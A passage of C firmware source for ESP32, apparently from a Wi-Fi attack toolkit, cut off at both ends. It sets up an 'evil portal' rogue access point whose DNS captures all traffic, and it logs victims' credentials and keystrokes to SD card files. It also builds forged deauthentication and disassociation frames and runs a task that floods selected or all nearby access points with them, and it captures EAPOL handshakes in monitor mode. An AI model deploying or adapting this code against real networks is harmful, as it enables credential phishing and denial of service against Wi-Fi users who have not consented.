                                          const char *ap_ssid, const char *domain) {
    login_done = false; // Reset login state on start
    current_creds_filename[0] = '\0'; // Reset filenames at the start
    current_keystrokes_filename[0] = '\0';
    portal_sd_jit_mounted = false;
    portal_display_suspended = false;
    // jit mount sd for somethingsomething template only
#ifdef CONFIG_BUILD_CONFIG_TEMPLATE
    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0) {
        if (!sd_card_manager.is_initialized) {
            if (sd_card_mount_for_flush(&portal_display_suspended) == ESP_OK) {
                portal_sd_jit_mounted = true;
            }
        }
    }
#endif
    // Log HTML buffer state at portal startup
    ESP_LOGI(TAG, "Evil portal starting - HTML buffer state: buffer=%p, size=%zu, use_html_buffer=%s", 
        html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");

    // Log first 100 characters of captured HTML if available
    if (html_buffer != NULL && html_buffer_size > 0) {
    char preview[101];
    size_t preview_len = html_buffer_size > 100 ? 100 : html_buffer_size;
    memcpy(preview, html_buffer, preview_len);
    preview[preview_len] = '\0';
    ESP_LOGI(TAG, "Captured HTML preview (first %zu chars): %.100s", preview_len, preview);
    }

    // Generate indexed filenames if SD card is available
    if (sd_card_manager.is_initialized) {
        const char* dir_path = "/mnt/ghostesp/evil_portal";
        int creds_index = get_next_file_index(dir_path, "portal_creds", "txt");
        int keys_index = get_next_file_index(dir_path, "portal_keystrokes", "txt");

        if (creds_index >= 0) {
            snprintf(current_creds_filename, sizeof(current_creds_filename),
                     "%s/portal_creds_%d.txt", dir_path, creds_index);
            printf("Logging credentials to: %s\n", current_creds_filename);
        } else {
            printf("Failed to get next index for credentials file.\n");
        }

        if (keys_index >= 0) {
            snprintf(current_keystrokes_filename, sizeof(current_keystrokes_filename),
                     "%s/portal_keystrokes_%d.txt", dir_path, keys_index);
            printf("Logging keystrokes to: %s\n", current_keystrokes_filename);
        } else {
             printf("Failed to get next index for keystrokes file.\n");
        }
    }

    // Check if we need to use the internal default portal
    if (URLorFilePath != NULL && strcmp(URLorFilePath, "default") == 0) {
        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
    } else if (URLorFilePath != NULL && strlen(URLorFilePath) < sizeof(PORTALURL)) {
        // If not default, copy the provided path
        strlcpy(PORTALURL, URLorFilePath, sizeof(PORTALURL));
    } else {
        // Handle invalid or too long paths by defaulting to internal portal as a fallback
        ESP_LOGW(TAG, "Invalid or too long URL/FilePath provided, defaulting to internal portal.");
        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
    }

    // Advertise Captive Portal API URI via DHCP (RFC 8910 / option 114) if available.
    if (strlen(PORTALURL) > 0) {
        esp_err_t rc = esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, (void *)PORTALURL, (uint32_t)(strlen(PORTALURL) + 1));
        if (rc == ESP_ERR_ESP_NETIF_DHCP_ALREADY_STARTED) {
            // DHCP server already running; restart it to apply the option
            esp_netif_dhcps_stop(wifiAP);
            rc = esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, (void *)PORTALURL, (uint32_t)(strlen(PORTALURL) + 1));
            esp_netif_dhcps_start(wifiAP);
        }
        if (rc != ESP_OK) {
            printf("Failed to set captive portal DHCP option: %s\n", esp_err_to_name(rc));
        } else {
            printf("Advertised captive portal URI via DHCP: %s\n", PORTALURL);
        }
    }

    // Domain is fetched from settings in commandline.c, just copy it if provided
    if (domain != NULL && strlen(domain) < sizeof(domain_str)) {
         strlcpy(domain_str, domain, sizeof(domain_str));
    } else {
         domain_str[0] = '\0'; // Ensure empty if invalid
    }

    ap_manager_stop_services();

    esp_netif_dns_info_t dnsserver;

    uint32_t my_ap_ip = esp_ip4addr_aton("192.168.4.1");

    esp_netif_ip_info_t ipInfo_ap;
    ipInfo_ap.ip.addr = my_ap_ip;
    ipInfo_ap.gw.addr = my_ap_ip;
    esp_netif_set_ip4_addr(&ipInfo_ap.netmask, 255, 255, 255, 0);
    esp_netif_dhcps_stop(wifiAP); // stop before setting ip WifiAP
    esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
    esp_netif_dhcps_start(wifiAP);

    wifi_config_t ap_config = {.ap = {
                                   .channel = 0,
                                   .ssid_hidden = 0,
                                   .max_connection = 8,
                                   .beacon_interval = 100,
                               }};

    // Configure AP SSID and optional PSK
    if (SSID != NULL && SSID[0] != '\0') {
        strlcpy((char *)ap_config.ap.ssid, SSID, sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen(SSID);
    } else {
        strlcpy((char *)ap_config.ap.ssid, ap_ssid, sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen(ap_ssid);
    }
    if (Password != NULL && Password[0] != '\0') {
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        strlcpy((char *)ap_config.ap.password, Password, sizeof(ap_config.ap.password));
    } else {
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
        memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
    }
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    dhcps_offer_t dhcps_dns_value = OFFER_DNS;
    esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
                           &dhcps_dns_value, sizeof(dhcps_dns_value));
    dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
    dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
    esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    start_portal_webserver();

    dns_server_config_t dns_config = {
        .num_of_entries = 1,
        .item = {{.name = "*", .if_key = NULL, .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}}}};

    dns_handle = start_dns_server(&dns_config);
    if (dns_handle) {
        printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
    } else {
        printf("Failed to start DNS server\n");
    }
    
    return ESP_OK; // Add return value at the end
}

void wifi_manager_stop_evil_portal() {
    login_done = false; // Reset login state on stop
    current_creds_filename[0] = '\0'; // Clear saved filenames
    current_keystrokes_filename[0] = '\0';
    
    // Free captured HTML buffer when portal stops to reclaim RAM
    wifi_manager_clear_html_buffer();

    if (dns_handle != NULL) {
        stop_dns_server(dns_handle);
        dns_handle = NULL;
    }

    if (evilportal_server != NULL) {
        httpd_stop(evilportal_server);
        evilportal_server = NULL;
    }

    ESP_ERROR_CHECK(esp_wifi_stop());

    ap_manager_init();

    // jit unmount sd if we mounted it for portal start
    if (portal_sd_jit_mounted) {
        sd_card_unmount_after_flush(portal_display_suspended);
        portal_sd_jit_mounted = false;
        portal_display_suspended = false;
    }
}

bool wifi_manager_is_evil_portal_active(void) {
    return evilportal_server != NULL;
}

// Release scan result buffers when they are no longer needed
void wifi_manager_clear_scan_results(void) {
    if (scanned_aps != NULL) {
        free(scanned_aps);
        scanned_aps = NULL;
        ap_count = 0;
    }
    if (selected_aps != NULL) {
        free(selected_aps);
        selected_aps = NULL;
        selected_ap_count = 0;
    }
}

void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
    if (callback == wifi_eapol_scan_callback) {
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        ESP_ERROR_CHECK(esp_wifi_start());
        // lock to selected AP channel if available
        extern wifi_ap_record_t selected_ap; // declared elsewhere in this module
        if (selected_ap.ssid[0] != '\0' && selected_ap.primary > 0) {
            esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
        }
    } else {
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_start());
    }

    // Set hardware-level promiscuous filter based on callback type
    wifi_promiscuous_filter_t filter = {0};
    
    // Determine filter mask based on callback function
    if (callback == wifi_beacon_scan_callback || callback == wifi_probe_scan_callback || 
        callback == wifi_deauth_scan_callback || callback == wifi_pwn_scan_callback ||
        callback == wifi_wps_detection_callback || callback == wifi_listen_probes_callback ||
        callback == wifi_pineap_detector_callback || callback == wardriving_scan_callback) {
        // Management frames only
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    } else if (callback == wifi_eapol_scan_callback) {
        // capture both mgmt and data for eapol + context frames
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    } else if (callback == sae_monitor_callback) {
        // Management frames for SAE
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    } else {
        // Default: capture all frame types (for raw capture, etc.)
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    }
    
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    ESP_LOGI("WIFI_MANAGER", "Set hardware filter mask: 0x%02" PRIx32, filter.filter_mask);

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));

    const char *cap_desc = "monitor";
    if (callback == wifi_eapol_scan_callback) cap_desc = "EAPOL";
    else if (callback == wifi_beacon_scan_callback) cap_desc = "beacon";
    else if (callback == wifi_probe_scan_callback) cap_desc = "probe";
    else if (callback == wifi_deauth_scan_callback) cap_desc = "deauth";
    else if (callback == wifi_wps_detection_callback) cap_desc = "wps";
    else if (callback == wifi_raw_scan_callback) cap_desc = "raw";

    uint8_t ch_primary = 0; wifi_second_chan_t ch_second = WIFI_SECOND_CHAN_NONE;
    (void)esp_wifi_get_channel(&ch_primary, &ch_second);

    const char *filter_desc = "all";
    if (filter.filter_mask == WIFI_PROMIS_FILTER_MASK_MGMT) filter_desc = "mgmt";
    else if (filter.filter_mask == WIFI_PROMIS_FILTER_MASK_DATA) filter_desc = "data";
    else if (filter.filter_mask == (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA)) filter_desc = "mgmt+data";

    printf("WiFi capture started.\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi capture started.\n");
    printf("Type: %s\n", cap_desc);
    TERMINAL_VIEW_ADD_TEXT("Type: %s\n", cap_desc);
    printf("Channel: %u\n", (unsigned)ch_primary);
    TERMINAL_VIEW_ADD_TEXT("Channel: %u\n", (unsigned)ch_primary);
    printf("Filter: %s\n", filter_desc);
    TERMINAL_VIEW_ADD_TEXT("Filter: %s\n", filter_desc);
    status_display_show_status("Monitor Started");
}
void wifi_manager_stop_monitor_mode() {
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
    printf("WiFi monitor stopped.\n");
    TERMINAL_VIEW_ADD_TEXT("WiFi monitor stopped.\n");
    status_display_show_status("Monitor Stopped");

    // Stop the station scan channel hopping timer if it's active
    if (scansta_hopping_active) {
        stop_scansta_channel_hopping();
    }

    // NOTE: Stopping the PineAP timer (channel_hop_timer) is handled by stop_pineap_detection() in callbacks.c
}

void wifi_manager_init(void) {

    // --- Memory check before WiFi init ---
    size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
    if (free_heap < (45 * 1024)) {
        ESP_LOGW(TAG, "WARNING: Less than 45KB of free RAM available (%d bytes). WiFi may fail to initialize or operate reliably!", (int)free_heap);
        TERMINAL_VIEW_ADD_TEXT("WARNING: <45KB RAM free (%d bytes). WiFi may not initialize or operate reliably!\n", (int)free_heap);
    }

    esp_log_level_set("wifi", ESP_LOG_ERROR); // Only show errors, not warnings

    // Disable WiFi power saving to improve connection stability
    esp_wifi_set_ps(WIFI_PS_NONE);

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    // Initialize the TCP/IP stack and WiFi driver
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    wifiAP = esp_netif_create_default_wifi_ap();
    wifiSTA = esp_netif_create_default_wifi_sta();

    // Initialize WiFi with default settings
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // configure country based on chip: full dual-band on C5, 2.4GHz only on others
#if CONFIG_IDF_TARGET_ESP32C5
    wifi_country_t current_country;
    esp_err_t get_country_err = esp_wifi_get_country(&current_country);
    if (get_country_err == ESP_OK) {
        ESP_LOGI(TAG, "ESP32-C5 Current Country: CC='%s', schan=%d, nchan=%d, policy=%s",
                 current_country.cc, current_country.schan, current_country.nchan,
                 current_country.policy == WIFI_COUNTRY_POLICY_AUTO ? "AUTO" : "MANUAL");
    } else {
        ESP_LOGW(TAG, "ESP32-C5: Failed to get current country config: %s", esp_err_to_name(get_country_err));
    }
#else
    // enable all 2.4 GHz channels (1-14) manually for other targets
    wifi_country_t country_to_set = {
        .cc     = "JP",
        .schan  = 1,
        .nchan  = 14,
        .policy = WIFI_COUNTRY_POLICY_MANUAL
    };
    ESP_LOGI(TAG, "Setting country for non-C5 target: CC='%s', schan=%d, nchan=%d, policy=MANUAL",
             country_to_set.cc, country_to_set.schan, country_to_set.nchan);
    ESP_ERROR_CHECK(esp_wifi_set_country(&country_to_set));
#endif

    // Create the WiFi event group
    wifi_event_group = xEventGroupCreate();

    // Register the event handler for WiFi events
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                                        &wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                                        &wifi_event_handler, NULL, NULL));

    // Set WiFi mode to STA (station)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    // Configure the SoftAP settings
    wifi_config_t ap_config = {
        .ap = {.ssid = "",
               .ssid_len = strlen(""),
               .password = "",
               .channel = 1,
               .authmode = WIFI_AUTH_OPEN,
               .max_connection = 4,
               .ssid_hidden = 1},
    };

    // Apply the AP configuration
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    // Start the Wi-Fi AP
    ESP_ERROR_CHECK(esp_wifi_start());
    
    // Additional WiFi stability settings
    // Set maximum TX power to improve signal strength
    esp_wifi_set_max_tx_power(78); // 19.5 dBm (78/4)
    
    // Set connection timeout to be more lenient
    esp_wifi_set_inactive_time(WIFI_IF_STA, 60); // 60 seconds before considering connection inactive

    // Initialize global CA certificate store
    ret = esp_crt_bundle_attach(NULL);
    if (ret == ESP_OK) {
        printf("Global CA certificate store initialized successfully.\n");
    } else {
        printf("Failed to initialize global CA certificate store: %s\n", esp_err_to_name(ret));
    }
}

void wifi_manager_configure_sta_from_settings(void) {
    // Configure STA with saved credentials for boot-time connection
    const char *saved_ssid = settings_get_sta_ssid(&G_Settings);
    const char *saved_password = settings_get_sta_password(&G_Settings);
    if (saved_ssid && strlen(saved_ssid) > 0) {
        wifi_config_t sta_config = {
            .sta = {
                .threshold.authmode = (saved_password && strlen(saved_password) > 0) ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN,
                .pmf_cfg = {.capable = true, .required = false},
            },
        };
        
        strlcpy((char *)sta_config.sta.ssid, saved_ssid, sizeof(sta_config.sta.ssid));
        if (saved_password) {
            strlcpy((char *)sta_config.sta.password, saved_password, sizeof(sta_config.sta.password));
        }
        
        esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &sta_config);
        if (err == ESP_OK) {
            printf("STA configured with saved credentials: %s\n", saved_ssid);
            
            // Mark that we've attempted boot connection and try to connect
            boot_connection_attempted = true;
            printf("Attempting boot-time connection to: %s\n", saved_ssid);
            TERMINAL_VIEW_ADD_TEXT("Connecting to saved network: %s\n", saved_ssid);
            
            esp_err_t connect_err = esp_wifi_connect();
            if (connect_err != ESP_OK) {
                printf("Failed to initiate connection: %s\n", esp_err_to_name(connect_err));
                TERMINAL_VIEW_ADD_TEXT("Failed to connect to saved network\n");
            }
        } else {
            printf("Failed to configure STA: %s\n", esp_err_to_name(err));
        }
    } else {
        printf("No saved WiFi credentials found\n");
    }
}

void wifi_manager_start_scan() {
    log_heap_status(TAG, "scan_start_pre");
    // Free any previous selections or scan buffers before starting a fresh scan
    if (selected_aps != NULL) {
        free(selected_aps);
        selected_aps = NULL;
        selected_ap_count = 0;
    }
    if (scanned_aps != NULL) {
        free(scanned_aps);
        scanned_aps = NULL;
        ap_count = 0;
    }
    ap_manager_stop_services();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}};

    rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);

    printf("WiFi Scan started\n");
    #ifdef CONFIG_IDF_TARGET_ESP32C5
        printf("Please wait 10 Seconds...\n");
        TERMINAL_VIEW_ADD_TEXT("Please wait 10 Seconds...\n");
    #else
        printf("Please wait 5 Seconds...\n");
        TERMINAL_VIEW_ADD_TEXT("Please wait 5 Seconds...\n");
    #endif
    esp_err_t err = esp_wifi_scan_start(&scan_config, true);

    if (err != ESP_OK) {
        printf("WiFi scan failed to start: %s", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
        log_heap_status(TAG, "scan_start_failed");
        return;
    }

    wifi_manager_stop_scan();
    log_heap_status(TAG, "scan_start_post");
    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(ap_manager_start_services());
}

// Stop scanning for networks
void wifi_manager_stop_scan() {
    esp_err_t err;

    log_heap_status(TAG, "scan_stop_pre");
    err = esp_wifi_scan_stop();
    if (err == ESP_ERR_WIFI_NOT_STARTED) {

        // commented out for now because it's cleaner without and stop commands send this when not
        // really needed

        /*printf("WiFi scan was not active.\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi scan was not active.\n"); */

        return;
    } else if (err != ESP_OK) {
        printf("Failed to stop WiFi scan: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to stop WiFi scan\n");
        return;
    }

    wifi_manager_stop_monitor_mode();
    rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);

    uint16_t initial_ap_count = 0;
    err = esp_wifi_scan_get_ap_num(&initial_ap_count);
    if (err != ESP_OK) {
        printf("Failed to get AP count: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("Failed to get AP count: %s\n", esp_err_to_name(err));
        return;
    }

    // only print AP count once, no need for both "Initial" and "Actual"
    printf("Found %u access points\n", initial_ap_count);
    TERMINAL_VIEW_ADD_TEXT("Found %u access points\n", initial_ap_count);

    // truncate to avoid excessive memory usage
    if (initial_ap_count > MAX_SCANNED_APS) {
        printf("too many aps (%u). truncating list to first %d\n", initial_ap_count, MAX_SCANNED_APS);
        TERMINAL_VIEW_ADD_TEXT("showing first %d aps (truncated)\n", MAX_SCANNED_APS);
        initial_ap_count = MAX_SCANNED_APS;
    }
    if (initial_ap_count > 0) {
        if (scanned_aps != NULL) {
            free(scanned_aps);
            scanned_aps = NULL;
        }
        
        if (selected_aps != NULL) {
            free(selected_aps);
            selected_aps = NULL;
            selected_ap_count = 0;
        }

        scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
        if (scanned_aps == NULL) {
            printf("Failed to allocate memory for AP info\n");
            ap_count = 0;
            return;
        }

        uint16_t actual_ap_count = initial_ap_count;
        err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
        if (err != ESP_OK) {
            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
            free(scanned_aps);
            scanned_aps = NULL;
            ap_count = 0;
            return;
        }

        ap_count = actual_ap_count;
    } else {
        printf("No access points found\n");
        ap_count = 0;
    }
}

void wifi_manager_list_stations() {
    if (station_count == 0) {
        printf("No stations found.\n");
        return;
    }
    printf("Listing all stations and their associated APs:\n");
    for (int i = 0; i < station_count; i++) {
        char sanitized_ssid[33]; // Buffer for sanitized SSID
        bool found = false;
        for (int j = 0; j < ap_count; j++) {
            if (memcmp(scanned_aps[j].bssid, station_ap_list[i].ap_bssid, 6) == 0) {
                sanitize_ssid_and_check_hidden(scanned_aps[j].ssid, sanitized_ssid, sizeof(sanitized_ssid));
                found = true;
                break;
            }
        }
        if (!found) {
            strcpy(sanitized_ssid, "(Unknown AP)");
         }
        printf("[%d] Station MAC: %02X:%02X:%02X:%02X:%02X:%02X, AP SSID: %s, AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
               i,
               station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2], station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
               sanitized_ssid,
               station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2], station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
        TERMINAL_VIEW_ADD_TEXT("[%d] Station MAC: %02X:%02X:%02X:%02X:%02X:%02X, AP SSID: %s, AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                               i,
                               station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2], station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
                               sanitized_ssid,
                               station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2], station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
    }
}

static bool check_packet_rate(void) {
    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds

    // Reset counter every second
    if (current_time - last_packet_time >= 1000) {
        packet_counter = 0;
        last_packet_time = current_time;
        return true;
    }

    // Check if we've exceeded our rate limit
    if (packet_counter >= MAX_PACKETS_PER_SECOND) {
        return false;
    }

    packet_counter++;
    return true;
}

static const uint8_t deauth_packet_template[26] = {
    0xc0, 0x00,                         // Frame Control
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00 // Reason code: Class 3 frame received from nonassociated STA
};

static const uint8_t disassoc_packet_template[26] = {
    0xa0, 0x00,                         // Frame Control (only first byte different)
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason code
};

esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        printf("Failed to set channel: %s\n", esp_err_to_name(err));
    }

    // Create packets from templates
    uint8_t deauth_frame[sizeof(deauth_packet_template)];
    uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
    memcpy(deauth_frame, deauth_packet_template, sizeof(deauth_packet_template));
    memcpy(disassoc_frame, disassoc_packet_template, sizeof(disassoc_packet_template));

    // Check if broadcast MAC
    bool is_broadcast = true;
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0xFF) {
            is_broadcast = false;
            break;
        }
    }

    // Direction 1: AP -> Station
    // Set destination (target)
    memcpy(&deauth_frame[4], mac, 6);
    memcpy(&disassoc_frame[4], mac, 6);

    // Set source and BSSID (AP)
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    memcpy(&disassoc_frame[10], bssid, 6);
    memcpy(&disassoc_frame[16], bssid, 6);

    // Add sequence number (random)
    uint16_t seq = (esp_random() & 0xFFF) << 4;
    deauth_frame[22] = seq & 0xFF;
    deauth_frame[23] = (seq >> 8) & 0xFF;
    disassoc_frame[22] = seq & 0xFF;
    disassoc_frame[23] = (seq >> 8) & 0xFF;

    // Send frames with rate limiting
    if (check_packet_rate()) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if(err == ESP_OK) deauth_packets_sent++;
        if (check_packet_rate()) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
    }

    // If not broadcast, send reverse direction
    if (!is_broadcast) {
        // Swap addresses for Station -> AP direction
        memcpy(&deauth_frame[4], bssid, 6); // Set destination as AP
        memcpy(&deauth_frame[10], mac, 6);  // Set source as station
        memcpy(&deauth_frame[16], mac, 6);  // Set BSSID as station

        memcpy(&disassoc_frame[4], bssid, 6);
        memcpy(&disassoc_frame[10], mac, 6);
        memcpy(&disassoc_frame[16], mac, 6);

        // New sequence number for reverse direction
        seq = (esp_random() & 0xFFF) << 4;
        deauth_frame[22] = seq & 0xFF;
        deauth_frame[23] = (seq >> 8) & 0xFF;
        disassoc_frame[22] = seq & 0xFF;
        disassoc_frame[23] = (seq >> 8) & 0xFF;

        // Send reverse frames with rate limiting
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
        if (check_packet_rate()) {
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
            if(err == ESP_OK) deauth_packets_sent++;
        }
    }

    return ESP_OK;
}
void wifi_deauth_task(void *param) {
    if (ap_count == 0) {
        printf("No access points found\n");
        printf("Please run 'scan -w' first to find targets\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("Please run 'scan -w' first to find targets\n");
        vTaskDelete(NULL);
        return;
    }

    wifi_ap_record_t *ap_info = scanned_aps;
    if (ap_info == NULL) {
        printf("Failed to allocate memory for AP info\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for AP info\n");
        vTaskDelete(NULL);
        return;
    }

    uint32_t last_log = 0;
    
    while (1) {
        if (selected_ap_count > 0 && selected_aps != NULL) {
            for (int sel_idx = 0; sel_idx < selected_ap_count; sel_idx++) {
                for (int i = 0; i < ap_count; i++) {
                    if (memcmp(ap_info[i].bssid, selected_aps[sel_idx].bssid, 6) == 0) {
                        int ch = ap_info[i].primary;
                        uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
                        for (int j = 0; j < station_count; j++) {
                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                            }
                        }
                        vTaskDelay(pdMS_TO_TICKS(50));
                    }
                }
            }
        } else if (strlen((const char *)selected_ap.ssid) > 0) {
            for (int i = 0; i < ap_count; i++) {
                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
                    int ch = ap_info[i].primary;
                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                            wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(50));
                }
            }
        } else {
            // Global deauth on each AP's channel
            for (int i = 0; i < ap_count; i++) {
                int ch = ap_info[i].primary;
                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
                    for (int j = 0; j < station_count; j++) {
                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                        }
                    }
                    vTaskDelay(pdMS_TO_TICKS(50));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(100));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
